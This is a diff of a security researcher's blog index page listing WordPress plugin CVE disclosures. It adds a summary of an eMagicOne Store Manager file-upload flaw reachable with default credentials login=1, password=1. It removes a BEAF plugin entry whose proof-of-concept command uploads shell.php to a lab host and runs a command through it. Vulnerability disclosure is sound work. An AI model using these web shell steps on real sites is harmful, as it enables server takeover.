@@ -72,7 +72,7 @@
 <meta property="og:url" content="https://ryankozak.com/" />
 
 
-<meta property="og:updated_time" content="2025-12-02T00:01:00Z" />
+<meta property="og:updated_time" content="2025-12-02T00:02:00Z" />
 
 
 <link rel="sitemap" type="application/xml" title="Sitemap" href='https://ryankozak.com/sitemap.xml' />
@@ -271,6 +271,8 @@
                 
                         
                 
+                        
+                
             
         
         
@@ -291,6 +293,10 @@
                         </li>
                         
                             <li class="bullet">
+                                <a href="https://ryankozak.com/posts/cve-2025-13390/">WP Directory Kit &lt;= 1.4.4 - Authentication Bypass to Privilege Escalation via Account Takeover</a>
+                            </li>
+                        
+                            <li class="bullet">
                                 <a href="https://ryankozak.com/posts/cve-2025-12585/">MxChat – AI Chatbot for WordPress &lt;= 2.5.5 - Unauthenticated Information Exposure</a>
                             </li>
                         
@@ -306,10 +312,6 @@
                                 <a href="https://ryankozak.com/posts/cve-2025-13380/">AI Engine for WordPress: ChatGPT, GPT Content Generator &lt;= 1.0.1 - Authenticated (Contributor&#43;) Arbitrary File Read</a>
                             </li>
                         
-                            <li class="bullet">
-                                <a href="https://ryankozak.com/posts/cve-2025-12135/">WPBookit &lt;= 1.0.6 - Unauthenticated Stored Cross-Site Scripting</a>
-                            </li>
-                        
                     
                 
             
@@ -318,6 +320,8 @@
                 
             
                 
+                
+                        
                 
                         
                 
@@ -415,6 +419,65 @@
                 <div class="posts">
     
     
+    <article class="post">
+        <div class="info">
+  <h1 class="post-title">
+    <a href="https://ryankozak.com/posts/cve-2025-5058/">eMagicOne Store Manager for WooCommerce &lt;= 1.2.5 - Unauthenticated Arbitrary File Upload via set_image Task</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2025-05-23T05:30:12Z" class="post-date">
+        May 23, 2025
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>3 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-CVE">
+        <a href="https://ryankozak.com/tags/cve">CVE</a>
+      </li>
+      
+      <li class="tag-WordPress">
+        <a href="https://ryankozak.com/tags/wordpress">WordPress</a>
+      </li>
+      
+      <li class="tag-eMagicOne">
+        <a href="https://ryankozak.com/tags/emagicone">eMagicOne</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+        
+        <h3 id="cve-2025-5058">CVE-2025-5058</h3>
+<p>The <a href="https://wordpress.org/plugins/store-manager-connector/" target="_blank">eMagicOne Store Manager for WooCommerce</a> plugin exposes a remote management protocol endpoint (<code>?connector=bridge</code>) that allows file uploads to the server. The authentication mechanism relies on a default credential pair (<code>login=1</code>, <code>password=1</code>) and a session key system. If the default credentials are not changed, an attacker can trivially authenticate, obtain a session key, and upload arbitrary files (including PHP shells) to the WordPress root or any writable directory via the <code>set_image</code> task.</p>
+        
+        <div class="read-more-link">
+            <a href="/posts/cve-2025-5058/">Read More…</a>
+        </div>
+        
+        
+    </article>
     <article class="post">
         <div class="info">
   <h1 class="post-title">
@@ -729,102 +792,6 @@
         
         <div class="read-more-link">
             <a href="/posts/cve-2025-47550/">Read More…</a>
-        </div>
-        
-        
-    </article>
-    <article class="post">
-        <div class="info">
-  <h1 class="post-title">
-    <a href="https://ryankozak.com/posts/cve-2025-47549/">Ultimate Before After Image Slider &amp; Gallery – BEAF &lt;= 4.6.10 - Authenticated (Admin&#43;) Arbitrary File Upload via beaf_options_save</a>
-  </h1>
-
-  <div class="headline">
-    <div>
-      
-      
-      <time datetime=" 2025-05-07T05:18:12Z" class="post-date">
-        May 7, 2025
-      </time>
-      
-      <span> - </span>
-      <span class="reading-time">
-        
-          
-        
-
-        <span>3 mins read</span>
-      </span>
-    </div>
-
-    
-    <ul class="tags">
-      
-      <li class="tag-CVE">
-        <a href="https://ryankozak.com/tags/cve">CVE</a>
-      </li>
-      
-      <li class="tag-WordPress">
-        <a href="https://ryankozak.com/tags/wordpress">WordPress</a>
-      </li>
-      
-    </ul>
-    
-  </div>
-
-  
-  
-
-  
-</div>
-
-        
-        <h3 id="cve-2025-47549">CVE-2025-47549</h3>
-<p>The <a href="https://wordpress.org/plugins/beaf-before-and-after-gallery/" target="_blank">Ultimate Before After Image Slider &amp; Gallery</a> plugin does not sanitize the file types of the <code>beaf_options_save</code> action, allowing administrators or above to upload arbitrary files and potentially gain code execution on the server.</p>
-<h2 id="tldr-exploits">TL;DR Exploits</h2>
-<ul>
-<li>A POC <a href="https://github.com/d0n601/CVE-2025-47549/blob/main/CVE-2025-47549.py" target="_blank">CVE-2025-47549.py</a> is provided to demonstrate an administrator uploading a web shell named <code>shell.php</code>.</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>python3 CVE-2025-47549.py https://lab1.hacker admin PASSWORD
-</span></span><span style="display:flex;"><span>Logging into: https://lab1.hacker/wp-admin
-</span></span><span style="display:flex;"><span>Extracting nonce values...
-</span></span><span style="display:flex;"><span>Uploading web shell: shell.php
-</span></span><span style="display:flex;"><span>{&#34;status&#34;:&#34;success&#34;,&#34;message&#34;:&#34;Options saved successfully!&#34;}
-</span></span><span style="display:flex;"><span>Web Shell Location: https://lab1.hacker/wp-content/uploads/itinerary-fonts/shell.php
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Executing test command: ip addr
-</span></span><span style="display:flex;"><span>&lt;pre&gt;1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
-</span></span><span style="display:flex;"><span>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
-</span></span><span style="display:flex;"><span>    inet 127.0.0.1/8 scope host lo
-</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
-</span></span><span style="display:flex;"><span>    inet6 ::1/128 scope host 
-</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
-</span></span><span style="display:flex;"><span>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
-</span></span><span style="display:flex;"><span>    link/ether 08:00:27:5b:34:2f brd ff:ff:ff:ff:ff:ff
-</span></span><span style="display:flex;"><span>    altname enp0s3
-</span></span><span style="display:flex;"><span>    inet 10.0.2.15/24 metric 100 brd 10.0.2.255 scope global dynamic eth0
-</span></span><span style="display:flex;"><span>       valid_lft 68200sec preferred_lft 68200sec
-</span></span><span style="display:flex;"><span>    inet6 fd17:625c:f037:2:a00:27ff:fe5b:342f/64 scope global dynamic mngtmpaddr noprefixroute 
-</span></span><span style="display:flex;"><span>       valid_lft 86113sec preferred_lft 14113sec
-</span></span><span style="display:flex;"><span>    inet6 fe80::a00:27ff:fe5b:342f/64 scope link 
-</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
-</span></span><span style="display:flex;"><span>3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
-</span></span><span style="display:flex;"><span>    link/ether 08:00:27:39:ea:eb brd ff:ff:ff:ff:ff:ff
-</span></span><span style="display:flex;"><span>    altname enp0s8
-</span></span><span style="display:flex;"><span>    inet 192.168.56.56/24 brd 192.168.56.255 scope global eth1
-</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
-</span></span><span style="display:flex;"><span>    inet6 fe80::a00:27ff:fe39:eaeb/64 scope link 
-</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
-</span></span><span style="display:flex;"><span>4: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default 
-</span></span><span style="display:flex;"><span>    link/ether 02:42:e5:9e:f6:23 brd ff:ff:ff:ff:ff:ff
-</span></span><span style="display:flex;"><span>    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
-</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
-</span></span><span style="display:flex;"><span>&lt;/pre&gt;
-</span></span></code></pre></div><h2 id="details">Details</h2>
-<p>The <code>beaf_options_save</code> action calls the <code>beaf_save_options()</code> function on line <a href="https://plugins.trac.wordpress.org/browser/beaf-before-and-after-gallery/trunk/admin/tf-options/classes/BEAF_Settings.php#L227" target="_blank">227</a> of <code>/wp-content/plugins/beaf-before-and-after-gallery/admin/tf-options/classes/BEAF_Settings.php</code> without enforcing any file type validation.</p>
-        
-        <div class="read-more-link">
-            <a href="/posts/cve-2025-47549/">Read More…</a>
         </div>
         
         
